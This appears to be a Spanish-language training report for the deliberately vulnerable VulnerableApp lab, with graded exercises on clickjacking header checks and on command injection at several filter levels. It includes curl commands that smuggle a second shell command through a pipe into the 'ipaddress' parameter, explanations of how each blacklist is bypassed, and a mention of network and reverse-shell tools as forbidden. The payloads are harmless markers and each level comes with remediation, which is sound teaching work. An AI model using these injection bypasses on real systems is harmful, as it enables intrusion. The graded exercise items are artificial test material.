overlayAttackSameOrigin devuelve 200 con X-Frame-Options: SAMEORIGIN y sin CSP, usa la misma plantilla LEVEL_4 y mantiene el overlay. El código lo presenta como el caso en que SAMEORIGIN bloquea framing cross-origin pero no evita un atacante del mismo origen.

@AttackVector describe CLICKJACKING_OVERLAY_SAMEORIGIN. Es el control contrastante de LEVEL_6 para mostrar que añadir SAMEORIGIN no resuelve el supuesto same-origin. La evidencia curl es únicamente la cabecera; la maqueta visual y su Ajax GET no prueban por sí mismos que se haya ejecutado una operación sensible real.

### clickjacking-01 · Nivel 1: detectar ausencia de protección de framing

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "absent",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded without framing protection. This page can be embedded in an iframe.",
    "isValid": true
  }
}

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Es el caso base: no existe una política HTTP que restrinja los ancestros del documento. El JSON 200 solo confirma la ruta y su contrato; la propiedad relevante es la ausencia de ambas cabeceras.

Desde Kali, solicitar solo el endpoint del laboratorio: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_1

Registrar el bloque de cabeceras y el JSON; no enviar parámetros ni credenciales porque el endpoint no los declara.

Usar LEVEL_4 y LEVEL_5 como controles positivos de comparación; no asignar hallazgo por el código de estado 200.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "En la salida de curl, confirmar que no aparece X-Frame-Options ni Content-Security-Policy. Esta comprobación de ausencia no demuestra que todo navegador vaya a permitir un iframe en todos los contextos."
}
```

**Pistas:**

La prueba específica exige ausencia de X-Frame-Options y Content-Security-Policy.

La ruta es GET y no tiene parámetros; la cabecera Content-Type de la petición no cambia el comportamiento del método.

Si se necesita evidencia de ejecución en navegador, debe observarse por separado la política de framing; el reflejo o la carga de un recurso no equivalen a ejecución.

**Corrección recomendada:** Emitir Content-Security-Policy: frame-ancestors 'none' si no se necesita framing, o una lista explícita de orígenes permitidos. Como compatibilidad heredada puede añadirse X-Frame-Options: DENY o SAMEORIGIN según el requisito, sin usar ALLOWALL.

### clickjacking-02 · Nivel 2: observar X-Frame-Options ALLOWALL

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "ALLOWALL",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded without framing protection. This page can be embedded in an iframe.",
    "isValid": true
  }
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servidor agrega literalmente ALLOWALL. El código del laboratorio lo considera permiso para cualquier origen y el test lo contrasta con la ausencia de DENY; no hay que convertir ese texto en una afirmación de que todos los navegadores implementan ese token de forma idéntica.

Solicitar el nivel: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_2

Comprobar que la cabecera X-Frame-Options tiene el valor ALLOWALL y que la respuesta conserva el JSON estático.

Comparar sin cambiar la petición con LEVEL_4: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_4

Tratar la comparación de cabeceras como evidencia del control; no concluir ejecución de clickjacking por un 200.

Registrar la misma prueba con el cliente del laboratorio:
lab request clickjacking-02 --method GET

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "X-Frame-Options",
  "value": "ALLOWALL"
}
```

**Pistas:**

La comprobación machine-readable recomendada es una coincidencia exacta de la cabecera.

ALLOWALL es una decisión insegura en este laboratorio y no una entrada controlada por el usuario.

El payload original es un iframe, pero curl no renderiza HTML.

**Corrección recomendada:** Sustituir ALLOWALL por X-Frame-Options: DENY/SAMEORIGIN o, preferentemente, una CSP frame-ancestors con los orígenes estrictamente necesarios. Verificar que un proxy no reescriba o elimine la cabecera.

### clickjacking-03 · Nivel 3: distinguir SAMEORIGIN de una denegación total

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "SAMEORIGIN",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded without framing protection. This page can be embedded in an iframe.",
    "isValid": true
  }
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

SAMEORIGIN es una defensa parcial: el navegador puede bloquear a un ancestro de otro origen, pero el propio sitio puede enmarcar la página. El test del repositorio clasifica este nivel como vulnerable porque el escenario de aprendizaje incluye un atacante del mismo origen.

Solicitar el nivel: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_3

Confirmar X-Frame-Options: SAMEORIGIN y ausencia de CSP en la salida.

Comparar con el control positivo total: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_4

Documentar que la diferencia observada es la política de ancestros, no el estado 200 ni el campo isValid.

Registrar la misma prueba con el cliente del laboratorio:
lab request clickjacking-03 --method GET

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "X-Frame-Options",
  "value": "SAMEORIGIN"
}
```

**Pistas:**

SAMEORIGIN no significa DENY.

El iframe de la plantilla LEVEL_1 apunta a la ruta del mismo despliegue /VulnerableApp.

Una comprobación de cabecera no sustituye una prueba de navegador desde el origen que se quiera evaluar.

**Corrección recomendada:** Si ninguna página debe incrustar el endpoint, usar DENY o CSP frame-ancestors 'none'. Si el framing same-origin es un requisito real, combinar una política explícita de ancestros con controles de autorización, CSRF y confirmaciones para operaciones con efectos.

### clickjacking-04 · Nivel 4: control positivo con X-Frame-Options DENY

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "DENY",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded with framing protection header set.",
    "isValid": true
  }
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Es un control positivo de la defensa heredada X-Frame-Options. El endpoint puede responder 200 a una petición HTTP directa aunque un navegador rechace la misma URL como contenido de un iframe; por eso el código de estado no debe usarse como prueba de que el framing sea posible.

Solicitar el control positivo: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_4

Confirmar X-Frame-Options: DENY y el cuerpo protegido.

Contrastar con el nivel vulnerable base: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_1

No atribuir el resultado a un clic: la evidencia reproducible de este ejercicio es la cabecera DENY.

Registrar la misma prueba con el cliente del laboratorio:
lab request clickjacking-04 --method GET

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "X-Frame-Options",
  "value": "DENY"
}
```

**Pistas:**

La anotación del nivel marca Variant.SECURE.

DENY impide framing independientemente del origen según la descripción del código.

El campo isValid permanece en true también en este nivel y no es un score.

**Corrección recomendada:** Mantener DENY cuando el recurso nunca necesita framing y añadir CSP frame-ancestors 'none' o una allowlist explícita como política moderna, validando la política efectiva después de proxies y CDN.

### clickjacking-05 · Nivel 5: control positivo con CSP frame-ancestors none

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "absent",
    "Content-Security-Policy": "frame-ancestors 'none'"
  },
  "json": {
    "content": "Page loaded with framing protection header set.",
    "isValid": true
  }
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Es el control positivo de la defensa CSP que el código describe como moderna. La petición directa sigue siendo 200; la decisión de permitir un documento como frame se toma al intentar cargarlo en un navegador y se debe verificar separadamente.

Solicitar el control CSP: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_5

Confirmar literalmente Content-Security-Policy: frame-ancestors 'none' y ausencia de X-Frame-Options.

Comparar con LEVEL_1: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_1

Conservar la respuesta de curl como evidencia de configuración; no usar un 200 ni un reflejo visual como prueba de framing.

Registrar la misma prueba con el cliente del laboratorio:
lab request clickjacking-05 --method GET

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "Content-Security-Policy",
  "value": "frame-ancestors 'none'"
}
```

**Pistas:**

El valor esperado incluye comillas simples alrededor de none.

La prueba unitaria específica busca frame-ancestors 'none'.

CSP y X-Frame-Options son cabeceras distintas; la ausencia de XFO no invalida este control CSP.

**Corrección recomendada:** Conservar frame-ancestors 'none' si no hay un caso de framing. Si existe uno, reemplazar none por una allowlist mínima de orígenes autorizados y revisar que no haya otra CSP posterior que modifique la política efectiva.

### clickjacking-06 · Nivel 6: reconocer el demo de overlay sin atribuir una acción por clic

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "absent",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded without framing protection. This page can be embedded in an iframe.",
    "isValid": true
  }
}

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

LEVEL_4/ClickjackingVulnerability.html construye una caja falsa de premio sobre un iframe víctima. Sin embargo, el CSS hace que el iframe no reciba eventos de puntero y el JavaScript ejecuta doGetAjaxCall sobre apiUrl desde el overlay. El ejercicio enseña el riesgo conceptual sin enviar credenciales ni tocar otro servicio.

Solicitar el endpoint sin parámetros: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_6

Registrar que no aparecen X-Frame-Options ni Content-Security-Policy y que el cuerpo es el mensaje estático del laboratorio.

Comparar las cabeceras con el control seguro: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_4

No atribuir puntaje ni hallazgo solo por pulsar la caja de premio: curl no emula un navegador y el código observado dispara un GET didáctico a la misma ruta.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar en la salida de curl la ausencia de X-Frame-Options y Content-Security-Policy; tratar la interfaz de overlay solo como demostración visual y no como prueba automática de una operación sensible."
}
```

**Pistas:**

La ruta usa htmlTemplate=LEVEL_4/ClickjackingVulnerability, aunque el número del nivel es LEVEL_6.

El receptor inocuo y Mailpit no son necesarios: esta familia no acepta una URL de salida ni envía correo.

Para un resultado automatizable, verifica cabeceras; reserva la evaluación de la UI para una comprobación manual explícita.

**Corrección recomendada:** Añadir DENY o CSP frame-ancestors 'none'/allowlist, y proteger cualquier acción real con POST, CSRF, SameSite y autorización del lado servidor. Un encabezado de framing no reemplaza esos controles de una operación con efectos.

### clickjacking-07 · Nivel 7: SAMEORIGIN no cubre el supuesto overlay same-origin

{
  "status": 200,
  "headers": {
    "X-Frame-Options": "SAMEORIGIN",
    "Content-Security-Policy": "absent"
  },
  "json": {
    "content": "Page loaded without framing protection. This page can be embedded in an iframe.",
    "isValid": true
  }
}

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El nivel conserva SAMEORIGIN y no añade CSP, por lo que el código lo contrasta con LEVEL_6: el framing cross-origin queda limitado, pero el escenario same-origin que enseña el laboratorio no queda denegado. El endpoint no modela una transacción real ni lee secretos.

Solicitar el endpoint: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_7

Confirmar X-Frame-Options: SAMEORIGIN, ausencia de CSP y el mensaje de respuesta sin protección.

Contrastar con el control positivo CSP: curl -i --get http://target:9090/VulnerableApp/ClickjackingVulnerability/LEVEL_5

No tratar un clic en la UI como verificación suficiente; el criterio reproducible es la política HTTP y la diferencia entre same-origin y deny-all.

Registrar la misma prueba con el cliente del laboratorio:
lab request clickjacking-07 --method GET

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "X-Frame-Options",
  "value": "SAMEORIGIN"
}
```

**Pistas:**

La descripción y el test del nivel identifican explícitamente SAMEORIGIN como insuficiente para el supuesto same-origin.

El payload original usa un iframe con opacidad baja, pero no es necesario reproducirlo para comprobar la cabecera.

No confundir la respuesta 200 con la posibilidad de que un navegador acepte el recurso como ancestro.

**Corrección recomendada:** Si la política requerida es ningún framing, cambiar a DENY y/o CSP frame-ancestors 'none'. Si se permite same-origin de forma deliberada, reducir las páginas con privilegios en ese origen y usar controles de autorización y CSRF para cualquier estado mutable.

### Límites de esta familia

[
  "El análisis estático corresponde al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. No se afirma que los ejercicios se hayan ejecutado con éxito contra target; los comandos son procedimientos sugeridos y seguros.",
  "El prefijo configurado en application.properties es /VulnerableApp. Las anotaciones de clase y método forman el nombre y LEVEL_n; el proveedor de endpoints y el controlador central construyen y publicitan las URLs con ese esquema. En una instalación con otro context path, el prefijo efectivo puede cambiar aunque los recursos JavaScript y payloads aquí leídos contienen /VulnerableApp/ de forma literal.",
  "Todos los niveles de esta familia son GET y no declaran parámetros de query, path ni body. No se usan POST, formularios, credenciales, cookies, archivos, correo, receptor externo ni URLs suministradas por el usuario.",
  "curl puede confirmar status, JSON y cabeceras, pero no aplica las decisiones de framing de un navegador, no crea un contexto de ancestro y no demuestra que un iframe se haya renderizado o bloqueado. Un 200 tampoco demuestra clickjacking.",
  "El significado práctico de ALLOWALL puede variar porque no es el valor estándar común de X-Frame-Options. La afirmación segura y reproducible es que este commit emite esa cadena y la clasifica como vulnerable; la interoperabilidad debe comprobarse con el navegador que se evalúe.",
  "La plantilla LEVEL_1 intenta leer contentDocument y muestra mensajes de carga/bloqueo, pero esa heurística depende del origen y de la política del navegador. La plantilla LEVEL_4 usa un iframe con pointer-events:none y una capa falsa que ejecuta un GET Ajax propio; por tanto, la demo no constituye evidencia de que el clic haya atravesado el iframe ni de que se haya usado una sesión autenticada.",
  "La respuesta usa isValid=true tanto en los niveles inseguros como en los seguros. Ese campo no es un resultado de explotación ni debe emplearse para puntuar.",
  "Los niveles 4 y 5 tienen rutas y Variant.SECURE, pero no llevan @AttackVector ni @ChallengeCard en la clase; por eso la metadata de vectores/desafíos puede no representarlos igual que los niveles 1–3 y 6–7, aunque las rutas sí existen y las pruebas unitarias verifican sus cabeceras.",
  "Un verificador honesto debe distinguir presencia de un texto o una cabecera de ejecución: reflejo no prueba ejecución XSS, un 200 no prueba IDOR y ningún click debe recibir puntaje por sí solo. Para esta familia, la evidencia automatizable propuesta se limita a las cabeceras esperadas, el JSON estático y una revisión manual separada del comportamiento del navegador."
]

## Inyección de comandos con marcadores seguros

La familia expone el controlador @VulnerableAppRestController(value = "CommandInjection") bajo el contexto autorizado /VulnerableApp. Cada método lleva @VulnerableAppRequestMapping con LEVEL_1 a LEVEL_6 y, al no sobrescribir requestMethod, todos son GET. En LEVEL_1–LEVEL_5 el código valida parcialmente la URL, pero cuando la validación pasa concatena ipaddress en "ping -c 2 <ipaddress>" y lo ejecuta mediante "sh -c" en Unix (o "cmd /c" en Windows); por tanto un separador de shell que sobreviva al filtro puede ejecutar el marcador inocuo "printf VA_LAB_OK". LEVEL_6 conserva la llamada a ping, pero solo permite una dirección IPv4 según IP_ADDRESS_PATTERN o el texto exacto "localhost" y está anotado variant = SECURE. Las respuestas son JSON GenericVulnerabilityResponseBean con content y isValid; el controlador pasa isValid=true incluso cuando el validator impide ejecutar y content queda vacío, así que ese booleano y un HTTP 200 no son pruebas de explotación.

### Todos los niveles originales

#### `GET /VulnerableApp/CommandInjection/LEVEL_1`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; se recibe como String"
}

Si ipaddress no está en blanco, ejecuta el comando de ping mediante una shell con el texto de ipaddress concatenado sin filtrado. En Unix la forma es sh -c 'ping -c 2 ' + ipaddress; captura stdout y stderr combinados en content. Si está vacío, no crea el proceso y content es una cadena vacía.

La ruta usa la plantilla común LEVEL_1/CI_Level1; el JavaScript concatena el valor del input en ?ipaddress= y coloca data.content con innerHTML. Para el laboratorio, el separador | seguido de printf VA_LAB_OK es suficiente y no requiere leer archivos ni contactar otra red. El wrapper responde isValid=true tanto si hubo ejecución como si el validator fue falso.

#### `GET /VulnerableApp/CommandInjection/LEVEL_2`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; además se inyecta RequestEntity para inspeccionar la URL original"
}

Exige ipaddress no vacío y rechaza si requestEntity.getUrl().toString() contiene cualquiera de ;, &, o un espacio literal mediante SEMICOLON_SPACE_LOGICAL_AND_PATTERN = [;& ]. Si pasa, concatena el valor decodificado en sh -c 'ping -c 2 ' + ipaddress. La inspección de la URL no bloquea separadores codificados que no sean esos tres caracteres literales.

El test dedicado demuestra que ; y & en la URL producen content vacío, mientras que un pipe codificado como %7C puede pasar. curl --data-urlencode realiza la codificación necesaria; no se debe convertir el ejercicio en una orden adicional ni sustituir el marcador.

#### `GET /VulnerableApp/CommandInjection/LEVEL_3`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; RequestEntity se usa como fuente de las comprobaciones de codificación"
}

Mantiene el filtro [;& ] de LEVEL_2 y añade comprobaciones exactas, sensibles a mayúsculas, para %26 y %3B en la URL. Por ello las variantes minúsculas %3b no son equivalentes a %3B para este código. Si pasa, vuelve a ejecutar el valor de ipaddress dentro de sh -c.

El comentario de la clase dice Case Insensitive, pero la implementación real de LEVEL_3 usa contains("%26") y contains("%3B") sin toUpperCase; los casos del test reflejan esa diferencia. %7C no es bloqueado por ninguna comprobación de este nivel.

#### `GET /VulnerableApp/CommandInjection/LEVEL_4`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; RequestEntity se usa como fuente de las comprobaciones de codificación"
}

Mantiene [;& ] y comprueba requestEntity.getUrl().toString().toUpperCase() contra %26 y %3B, bloqueando las mayúsculas y minúsculas de esas codificaciones. No comprueba %7C ni separadores de línea. Cuando pasa, concatena ipaddress en sh -c.

El test dedicado muestra que %3B y %3b quedan bloqueados, pero la propia lógica todavía deja pasar un pipe codificado. El ejemplo histórico del código usa cat /etc/passwd; no se reproduce aquí: el único payload autorizado en este informe es printf VA_LAB_OK.

#### `GET /VulnerableApp/CommandInjection/LEVEL_5`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; RequestEntity se usa como fuente de las comprobaciones de codificación"
}

Mantiene los filtros de LEVEL_4 y añade requestEntity.getUrl().toString().toUpperCase().contains("%7C"). El pipe ya no atraviesa ese filtro, pero no se comprueba %0A: un salto de línea codificado puede separar la orden de ping del printf cuando el valor se concatena en sh -c.

El comentario fuente identifica explícitamente el payload de salto de línea. El ejercicio usa Bash $'...' para que curl envíe un salto de línea real que --data-urlencode codifica; solo se añade el marcador VA_LAB_OK y no se usan órdenes de inspección, redirección, red, secretos, shell inversa, DoS ni borrado.

#### `GET /VulnerableApp/CommandInjection/LEVEL_6`

**Entrada:** {
  "ipaddress": "Parámetro de consulta obligatorio; debe coincidir con una IPv4 completa según IP_ADDRESS_PATTERN o ser exactamente localhost"
}

Está anotado variant = SECURE. El validator exige texto no vacío y que ipaddress coincida con la expresión de IPv4 o sea exactamente localhost. Para entradas válidas ejecuta el ping permitido; para una entrada con metacaracteres, como 127.0.0.1|printf VA_LAB_OK, no crea proceso y content queda vacío. La respuesta sigue llevando isValid=true por la construcción fija del bean.

La seguridad observada es la lista permitida, no la eliminación del shell: el código aún usa sh -c para la entrada ya validada. Una validación de código no sustituye una prueba de integración; conviene reforzarla ejecutando ProcessBuilder con argumentos separados y timeout. La clase completa está bajo @Profile("unsafe"), por lo que la disponibilidad depende del perfil del despliegue.

### commandInjection-01 · LEVEL_1 — control negativo con una dirección local permitida

Respuesta 200 JSON con isValid=true y content dependiente de la salida de ping. El contenido exacto puede variar según la imagen; no debe contener VA_LAB_OK.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Es el control negativo de LEVEL_1: ipaddress es una IPv4 ordinaria y no contiene un separador. Sirve para distinguir la salida normal de la salida del marcador; un 200 por sí solo no demuestra nada sobre la ejecución de una segunda orden.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_1 --data-urlencode 'ipaddress=127.0.0.1'
```

Revisar únicamente el JSON devuelto y comprobar que $.content no contiene VA_LAB_OK; no puntuar por abrir o hacer clic en la interfaz.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-01 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

Mantén el parámetro como una IPv4 simple para el control.

La salida de ping y el estado de red del contenedor no son una cadena fija; usa solo la ausencia del marcador como control.

El campo isValid se fija a true en el wrapper y no es un indicador de ejecución de órdenes.

**Corrección recomendada:** No concatenar datos en una shell. Si el proceso de ping es imprescindible, usar ProcessBuilder con una lista de argumentos separados, validar una IPv4 con una biblioteca o allowlist y aplicar timeout; no depender de un filtro de caracteres.

### commandInjection-02 · LEVEL_1 — marcador seguro de ejecución de la shell

Si el laboratorio está desplegado con esta implementación, content debe contener VA_LAB_OK porque la entrada llega a sh -c. El resto de la salida puede contener errores o salida de ping; no se exige texto exacto.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El pipe separa el ping del builtin printf después de la concatenación insegura. El marcador no lee datos, no abre conexiones y no altera el estado; demuestra solo que esa composición alcanzó la segunda etapa del pipeline.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_1 --data-urlencode 'ipaddress=127.0.0.1|printf VA_LAB_OK'
```

Parsear la respuesta JSON y verificar que $.content contiene VA_LAB_OK; no inferir ejecución arbitraria más allá del marcador.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-02 --method GET --param 'ipaddress=127.0.0.1|printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "CommandInjection/LEVEL_1",
  "method": "GET",
  "params": {
    "ipaddress": "127.0.0.1"
  },
  "headers": {},
  "body": null,
  "content_type": null,
  "check": {
    "kind": "not_contains",
    "value": "VA_LAB_OK",
    "path": "content"
  }
}
```

**Pistas:**

--data-urlencode codifica el pipe y el espacio para transporte HTTP, mientras Spring entrega el valor del parámetro a la lógica.

No agregues otra orden, archivo, redirección ni destino de red: el payload permitido termina en printf VA_LAB_OK.

La presencia del marcador es la señal; el código HTTP 200 y isValid=true no sustituyen ese check.

**Corrección recomendada:** Eliminar la shell y pasar la dirección como un único argumento a ProcessBuilder; aplicar allowlist de IP/hostname antes de ejecutar y no devolver stdout sin necesidad.

### commandInjection-03 · LEVEL_2 — control negativo frente al filtro de separadores

Respuesta 200 JSON; content puede contener ping normal y no debe contener VA_LAB_OK.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El caso base confirma que la dirección ordinaria sigue el flujo normal. Como el filtro inspecciona la URL completa, no debe usarse el booleano isValid como resultado del control.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_2 --data-urlencode 'ipaddress=127.0.0.1'
```

Comprobar que $.content no contiene VA_LAB_OK y conservar la respuesta para compararla con el positivo.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-03 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

La ruta es LEVEL_2 y el único parámetro es ipaddress.

No conviertas este control en un test de disponibilidad exacta de ping; la imagen puede devolver texto diferente.

Compara el contenido, no solo el código de estado.

**Corrección recomendada:** Usar ejecución sin shell y validación positiva de una dirección, no una exclusión de ;, &, espacio u otros caracteres en la URL.

### commandInjection-04 · LEVEL_2 — pipe codificado que sobrevive al filtro

El pipe transportado como %7C no coincide con [;& ] ni con los caracteres codificados que LEVEL_2 revisa; en el código observado content debe contener VA_LAB_OK si la petición llega sin normalización intermedia.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_2 pretende bloquear separadores sencillos mirando la URL, pero no incluye el pipe. curl codifica el payload y el servidor decodifica ipaddress antes de construir la orden; el marcador solo prueba la ejecución de esa segunda etapa.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_2 --data-urlencode 'ipaddress=127.0.0.1|printf VA_LAB_OK'
```

Verificar que $.content contiene VA_LAB_OK; si no aparece, registrar la URL realmente enviada y si algún proxy decodificó o recodificó el parámetro, sin cambiar el payload seguro.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-04 --method GET --param 'ipaddress=127.0.0.1|printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "CommandInjection/LEVEL_2",
  "method": "GET",
  "params": {
    "ipaddress": "127.0.0.1"
  },
  "headers": {},
  "body": null,
  "content_type": null,
  "check": {
    "kind": "not_contains",
    "value": "VA_LAB_OK",
    "path": "content"
  }
}
```

**Pistas:**

Usa exactamente printf VA_LAB_OK como única segunda acción.

El filtro de LEVEL_2 busca ;, &, y espacio literal en requestEntity.getUrl().toString(), no el pipe codificado.

Un resultado 200 sin el marcador es inconcluso como evidencia de vulnerabilidad.

**Corrección recomendada:** Sustituir la composición de shell por ProcessBuilder(List.of("ping", "-c", "2", ipAddress)) después de una validación estricta, y restringir tiempo y salida.

### commandInjection-05 · LEVEL_3 — control negativo con validación de URL extendida

Respuesta 200 JSON con salida normal o vacía según ping, sin VA_LAB_OK.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Es el control base para LEVEL_3. La salida exacta de ping no está fijada por el test de integración de este informe; la comprobación útil es que el marcador de la segunda orden no aparece.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_3 --data-urlencode 'ipaddress=127.0.0.1'
```

Comprobar $.content con ausencia de VA_LAB_OK y comparar con el positivo del mismo nivel.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-05 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

No dependas de una respuesta exacta de ping.

El mismo parámetro y método se usan en todos los niveles; cambia solo la ruta y el control.

No atribuyas puntuación por el clic del botón de la plantilla.

**Corrección recomendada:** Aplicar allowlist de dirección y ejecución por argumentos; las comprobaciones de textos %26/%3B no constituyen una defensa contra la gramática completa de una shell.

### commandInjection-06 · LEVEL_3 — pipe no cubierto por %26/%3B

El control extra de LEVEL_3 solo busca %26 y %3B con coincidencia sensible a mayúsculas; el pipe codificado no coincide y content debería contener VA_LAB_OK en el despliegue del commit.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este positivo contrasta con LEVEL_2 y muestra que agregar dos cadenas prohibidas no cubre el metacarácter pipe. El valor se limita a un printf fijo, por lo que no se extraen secretos ni se ejecutan órdenes externas adicionales.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_3 --data-urlencode 'ipaddress=127.0.0.1|printf VA_LAB_OK'
```

Buscar VA_LAB_OK en $.content. Si un componente HTTP cambia la representación de la URL, anotar la incertidumbre: este informe no afirma que el entorno real se haya ejecutado.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-06 --method GET --param 'ipaddress=127.0.0.1|printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "CommandInjection/LEVEL_3",
  "method": "GET",
  "params": {
    "ipaddress": "127.0.0.1"
  },
  "headers": {},
  "body": null,
  "content_type": null,
  "check": {
    "kind": "not_contains",
    "value": "VA_LAB_OK",
    "path": "content"
  }
}
```

**Pistas:**

El comentario Case Insensitive no coincide completamente con los contains exactos de la implementación; no es necesario explotar esa diferencia para este positivo.

El único indicador aceptable es el marcador literal.

No uses el ejemplo histórico con lectura de archivos.

**Corrección recomendada:** No intentes ampliar una blacklist; elimina sh -c, pasa el argumento separado y valida la dirección con una política positiva.

### commandInjection-07 · LEVEL_4 — control negativo con comprobaciones codificadas sin marcador

Respuesta 200 JSON; content puede depender de ping, pero no contiene VA_LAB_OK.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El control negativo evita confundir la disponibilidad del endpoint con la ejecución del marcador. LEVEL_4 hace sus comprobaciones en mayúsculas, pero una dirección normal no activa ninguna ruta de shell adicional.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_4 --data-urlencode 'ipaddress=127.0.0.1'
```

Comprobar ausencia de VA_LAB_OK en $.content.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-07 --method GET --param ipaddress=127.0.0.1

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

**Pistas:**

El hecho de que el filtro use toUpperCase() no cambia el resultado del caso base.

No uses un 200 como único criterio.

La plantilla HTML solo es una interfaz; la verificación se hace sobre JSON.

**Corrección recomendada:** Validar con una parser de IP y usar una API de proceso sin intérprete. Si se devuelve salida, tratarla como datos y no insertarla con innerHTML.

### commandInjection-08 · LEVEL_4 — pipe que queda fuera de la blacklist ampliada

El filtro sensible a mayúsculas bloquea %26/%3B, pero no %7C; si la entrada alcanza sh -c, content debe contener VA_LAB_OK.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El positivo muestra el límite de la defensa de LEVEL_4 sin leer archivos ni ejecutar una operación de red. Solo se observa la salida del printf fijo.

```bash
curl -i --get http://target:9090/VulnerableApp/CommandInjection/LEVEL_4 --data-urlencode 'ipaddress=127.0.0.1|printf VA_LAB_OK'
```

Verificar que $.content contiene VA_LAB_OK y conservar el caso base como control negativo.

Registrar la misma prueba con el cliente del laboratorio:
lab request commandInjection-08 --method GET --param 'ipaddress=127.0.0.1|printf VA_LAB_OK'

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_OK",
  "path": "content"
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "CommandInjection/LEVEL_4",
  "method": "GET",
  "params": {
    "ipaddress": "127.0.0.1"
  },
  "headers": {},
  "body": null,
  "content_type": null,
  "check": {
    "kind": "not_contains",
    "value": "VA_LAB_OK",
    "path": "content"
  }
}
```

**Pistas:**

--data-urlencode mantiene el separador fuera de la forma literal de la URL.

El marcador no debe cambiarse por id, cat, nc, una shell inversa ni una lectura de archivos.

